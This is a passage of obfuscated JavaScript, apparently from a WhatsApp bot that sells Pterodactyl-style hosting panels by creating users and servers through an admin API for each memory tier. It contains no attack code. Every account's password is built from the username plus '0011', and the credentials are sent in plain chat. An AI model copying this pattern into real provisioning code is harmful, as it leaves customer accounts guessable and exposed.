                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x32660a)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3bd866 = await _0x435e0c.json();
          if (_0x3bd866.errors) {
            return _0x2d94c9(JSON.stringify(_0x3bd866.errors[0x0], null, 0x2));
          }
        }
        break;
      case '6gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x4c0e69 = _0x5592c0.split(',');
          if (_0x4c0e69.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x342589 = _0x4c0e69[0x0];
          let _0x13f91f = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x4c0e69[0x1] ? _0x4c0e69[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x2f3746 = _0x342589 + '6GB';
          let _0x204bb4 = global.eggsnya;
          let _0x535b88 = global.location;
          let _0x2146d3 = _0x342589 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x13f91f) {
            return;
          }
          let _0x284f62 = _0x342589 + "0011";
          let _0x353e7e = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2146d3,
              'username': _0x342589,
              'first_name': _0x342589,
              'last_name': _0x342589,
              'language': 'en',
              'password': _0x284f62
            })
          });
          let _0x27e6b2 = await _0x353e7e.json();
          if (_0x27e6b2.errors) {
            return _0x2d94c9(JSON.stringify(_0x27e6b2.errors[0x0], null, 0x2));
          }
          let _0x1a5a7e = _0x27e6b2.attributes;
          let _0x34019c = await fetch(domain + '/api/application/nests/5/eggs/' + _0x204bb4, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x1a5a7e.id);
          ctf = "Hai @" + _0x13f91f.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1a5a7e.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x284f62 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x13f91f, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x47f597 = await _0x34019c.json();
          let _0x39187f = _0x47f597.attributes.startup;
          let _0x23145f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2f3746,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1a5a7e.id,
              'egg': parseInt(_0x204bb4),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x39187f,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '6144',
                'swap': 0x0,
                'disk': "6144",
                'io': 0x1f4,
                'cpu': "150"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x535b88)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4fdeac = await _0x23145f.json();
          if (_0x4fdeac.errors) {
            return _0x2d94c9(JSON.stringify(_0x4fdeac.errors[0x0], null, 0x2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2a24ce = _0x5592c0.split(',');
          if (_0x2a24ce.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0xf02efe = _0x2a24ce[0x0];
          let _0x2ae518 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2a24ce[0x1] ? _0x2a24ce[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x4d9b5c = _0xf02efe + "7GB";
          let _0x1e2f34 = global.eggsnya;
          let _0xbf9cce = global.location;
          let _0x4f3bad = _0xf02efe + "1398@gmail.com";
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpgg';
          if (!_0x2ae518) {
            return;
          }
          let _0x894fe2 = _0xf02efe + "0011";
          let _0x303596 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4f3bad,
              'username': _0xf02efe,
              'first_name': _0xf02efe,
              'last_name': _0xf02efe,
              'language': 'en',
              'password': _0x894fe2
            })
          });
          let _0x52605d = await _0x303596.json();
          if (_0x52605d.errors) {
            return _0x2d94c9(JSON.stringify(_0x52605d.errors[0x0], null, 0x2));
          }
          let _0x5465c0 = _0x52605d.attributes;
          let _0x4bcf54 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1e2f34, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x5465c0.id);
          ctf = "Hai @" + _0x2ae518.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x5465c0.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x894fe2 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x2ae518, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x14acea = await _0x4bcf54.json();
          let _0x51034f = _0x14acea.attributes.startup;
          let _0x164fe7 = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4d9b5c,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x5465c0.id,
              'egg': parseInt(_0x1e2f34),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x51034f,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '7168',
                'swap': 0x0,
                'disk': "7168",
                'io': 0x1f4,
                'cpu': "170"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0xbf9cce)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x440743 = await _0x164fe7.json();
          if (_0x440743.errors) {
            return _0x2d94c9(JSON.stringify(_0x440743.errors[0x0], null, 0x2));
          }
        }
        break;
      case "8gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x1341ed = _0x5592c0.split(',');
          if (_0x1341ed.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x19b68b = _0x1341ed[0x0];
          let _0x2ba5ef = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x1341ed[0x1] ? _0x1341ed[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x581dc0 = _0x19b68b + "8GB";
          let _0x5a18f3 = global.eggsnya;
          let _0x1fefbf = global.location;
          let _0x2f9f0c = _0x19b68b + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2ba5ef) {
            return;
          }
          let _0x10d5da = _0x19b68b + "0011";
          let _0x37e5da = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2f9f0c,
              'username': _0x19b68b,
              'first_name': _0x19b68b,
              'last_name': _0x19b68b,
              'language': 'en',
              'password': _0x10d5da
            })
          });
          let _0x1b6ced = await _0x37e5da.json();
          if (_0x1b6ced.errors) {
            return _0x2d94c9(JSON.stringify(_0x1b6ced.errors[0x0], null, 0x2));
          }
          let _0x35590c = _0x1b6ced.attributes;
          let _0x30e593 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x5a18f3, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x35590c.id);
          ctf = "Hai @" + _0x2ba5ef.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x35590c.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x10d5da + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x2ba5ef, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x48483a = await _0x30e593.json();
          let _0xc3d40d = _0x48483a.attributes.startup;
          let _0x57306b = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x581dc0,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x35590c.id,
              'egg': parseInt(_0x5a18f3),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0xc3d40d,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '8192',
                'swap': 0x0,
                'disk': "8192",
                'io': 0x1f4,
                'cpu': "200"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1fefbf)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x299a03 = await _0x57306b.json();
          if (_0x299a03.errors) {
            return _0x2d94c9(JSON.stringify(_0x299a03.errors[0x0], null, 0x2));
          }
        }
        break;
      case "9gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x17a20c = _0x5592c0.split(',');
          if (_0x17a20c.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x5866af = _0x17a20c[0x0];
          let _0x9e406a = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x17a20c[0x1] ? _0x17a20c[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x2831a5 = _0x5866af + "9GB";
          let _0x15328 = global.eggsnya;
          let _0x59bfea = global.location;
          let _0x46818d = _0x5866af + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x9e406a) {
            return;
          }
          let _0x1ec63a = _0x5866af + "0011";
          let _0x18bae8 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x46818d,
              'username': _0x5866af,
              'first_name': _0x5866af,
              'last_name': _0x5866af,
              'language': 'en',
              'password': _0x1ec63a
            })
          });
          let _0x25c12e = await _0x18bae8.json();
          if (_0x25c12e.errors) {
            return _0x2d94c9(JSON.stringify(_0x25c12e.errors[0x0], null, 0x2));
          }
          let _0x255d25 = _0x25c12e.attributes;
          let _0x43921d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x15328, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x255d25.id);
          ctf = "Hai @" + _0x9e406a.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x255d25.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x1ec63a + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x9e406a, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x25c552 = await _0x43921d.json();
          let _0x26df27 = _0x25c552.attributes.startup;
          let _0x495078 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2831a5,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x255d25.id,
              'egg': parseInt(_0x15328),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x26df27,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '9216',
                'swap': 0x0,
                'disk': "9216",
                'io': 0x1f4,
                'cpu': '220'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x59bfea)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x210379 = await _0x495078.json();
          if (_0x210379.errors) {
            return _0x2d94c9(JSON.stringify(_0x210379.errors[0x0], null, 0x2));
          }
        }
        break;
      case "10gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2a4a1f = _0x5592c0.split(',');
          if (_0x2a4a1f.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x325c1b = _0x2a4a1f[0x0];
          let _0x2b3daf = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2a4a1f[0x1] ? _0x2a4a1f[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x3770e6 = _0x325c1b + "10GB";
          let _0x5cfb8e = global.eggsnya;
          let _0x425284 = global.location;
          let _0x2beb38 = _0x325c1b + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2b3daf) {
            return;
          }
          let _0x30ef1d = _0x325c1b + "0011";
          let _0x547712 = await fetch(domain + '/api/application/users', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2beb38,
              'username': _0x325c1b,
              'first_name': _0x325c1b,
              'last_name': _0x325c1b,
              'language': 'en',
              'password': _0x30ef1d
            })
          });
          let _0xa9a9fd = await _0x547712.json();
          if (_0xa9a9fd.errors) {
            return _0x2d94c9(JSON.stringify(_0xa9a9fd.errors[0x0], null, 0x2));
          }
          let _0x211ba = _0xa9a9fd.attributes;
          let _0x534e71 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x5cfb8e, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x211ba.id);
          ctf = "Hai @" + _0x2b3daf.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x211ba.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x30ef1d + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x2b3daf, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x58a035 = await _0x534e71.json();
          let _0xb28421 = _0x58a035.attributes.startup;
          let _0x3a6fdb = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3770e6,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x211ba.id,
              'egg': parseInt(_0x5cfb8e),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0xb28421,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "10240",
                'swap': 0x0,
                'disk': "10240",
                'io': 0x1f4,
                'cpu': "250"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x425284)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x59c6ba = await _0x3a6fdb.json();
          if (_0x59c6ba.errors) {
            return _0x2d94c9(JSON.stringify(_0x59c6ba.errors[0x0], null, 0x2));
          }
        }
        break;
      case "21gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x3e53c5 = _0x5592c0.split(',');
          if (_0x3e53c5.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x2c54cd = _0x3e53c5[0x0];
          let _0x525f82 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x3e53c5[0x1] ? _0x3e53c5[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x30193b = _0x2c54cd + "20GB";
          let _0x24a3fd = global.eggsnya;
          let _0x1cbbd5 = global.location;
          let _0x278532 = _0x2c54cd + '1398@gmail.com';
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x525f82) {
            return;
          }
          let _0xeae96f = _0x2c54cd + '0011';
          let _0x3eed7c = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x278532,
              'username': _0x2c54cd,
              'first_name': _0x2c54cd,
              'last_name': _0x2c54cd,
              'language': 'en',
              'password': _0xeae96f
            })
          });
          let _0x103bc5 = await _0x3eed7c.json();
          if (_0x103bc5.errors) {
            return _0x2d94c9(JSON.stringify(_0x103bc5.errors[0x0], null, 0x2));
          }
          let _0xcee142 = _0x103bc5.attributes;
          let _0x3606a2 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x24a3fd, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0xcee142.id);
          ctf = "Hai @" + _0x525f82.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0xcee142.username + "\n⎙─➤ *🔐PASSWORD* : " + _0xeae96f + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x525f82, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x1cea20 = await _0x3606a2.json();
          let _0x41f970 = _0x1cea20.attributes.startup;
          let _0x86276f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x30193b,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0xcee142.id,
              'egg': parseInt(_0x24a3fd),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x41f970,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "20240",
                'swap': 0x0,
                'disk': "20240",
                'io': 0x1f4,
                'cpu': "530"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1cbbd5)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4f9a2b = await _0x86276f.json();
          if (_0x4f9a2b.errors) {
            return _0x2d94c9(JSON.stringify(_0x4f9a2b.errors[0x0], null, 0x2));
          }
        }
        break;
      case "25gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0xabc2a4 = _0x5592c0.split(',');
          if (_0xabc2a4.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x22bc80 = _0xabc2a4[0x0];
          let _0x4bd2cc = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0xabc2a4[0x1] ? _0xabc2a4[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x2f56a9 = _0x22bc80 + '25GB';
          let _0x49cbe0 = global.eggsnya;
          let _0x1040ef = global.location;
          let _0x881c04 = _0x22bc80 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4bd2cc) {
            return;
          }
          let _0x5e830f = _0x22bc80 + "0011";
          let _0x1eed0f = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x881c04,
              'username': _0x22bc80,
              'first_name': _0x22bc80,
              'last_name': _0x22bc80,
              'language': 'en',
              'password': _0x5e830f
            })
          });
          let _0x1d7baf = await _0x1eed0f.json();
          if (_0x1d7baf.errors) {
            return _0x2d94c9(JSON.stringify(_0x1d7baf.errors[0x0], null, 0x2));
          }
          let _0x45f8e6 = _0x1d7baf.attributes;
          let _0x15b24a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x49cbe0, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
